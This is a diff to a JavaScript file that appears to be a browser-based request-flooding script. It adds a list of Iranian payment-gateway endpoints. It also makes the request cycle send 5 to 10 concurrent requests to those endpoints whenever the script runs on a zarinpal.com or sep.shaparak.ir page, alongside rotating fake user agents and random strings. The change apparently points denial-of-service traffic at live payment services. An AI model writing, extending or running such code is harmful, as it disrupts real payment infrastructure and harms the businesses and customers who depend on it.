@@ -398,7 +398,6 @@
         "https://2i2c-org.github.io/",
         "https://unetbootin.github.io/",
         "https://indico.github.io/",
-        "https://payment.zarinpal.com/pg/v4/payment/request.json",
         "https://ooni.github.io/"
     ];
 
@@ -410,6 +409,21 @@
         "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/116.0 Firefox/116.0",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
         "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
+    ];
+
+    const allowedUrls = [
+        "https://ipg.novinopay.com/StartPay/812F739E41057BAC22331918CD5B41C2",
+        "https://pms.rayanpay.com/api/v2/ipg/paymentrequest",
+        "https://api.parspal.com/v1/",
+        "https://nextpay.org/nx/gateway/payment/",
+        "https://core.inopal.ir/api/pardakht/payment",
+        "https://dargaah.com/payment",
+        "https://hoorpay.ir/webservice/rest/PaymentRequest",
+        "https://core.paystar.ir/api/open-banking/application/refresh-api-key",
+        "https://noyanpay.ir/",
+        "https://polam.io/invoice/request",
+        "https://ipg.vandar.io/api/v4/send",
+        "https://panel.aqayepardakht.ir/api/v2/create"
     ];
 
     const generateRandomString = () => (Math.random() + 1).toString(36).substring(2);
@@ -454,8 +468,11 @@
     const runCycle = async () => {
         const selectedUrls = [];
         const count = Math.floor(Math.random() * 6) + 5;
+        const currentUrl = window.location.href.toLowerCase();
+        const targetUrls = (currentUrl.includes('zarinpal.com') || currentUrl.includes('sep.shaparak.ir')) ? allowedUrls : urls;
+
         for (let i = 0; i < count; i++) {
-            selectedUrls.push(urls[Math.floor(Math.random() * urls.length)]);
+            selectedUrls.push(targetUrls[Math.floor(Math.random() * targetUrls.length)]);
         }
         await Promise.all(selectedUrls.map(url => sendRequest(url)));
     };
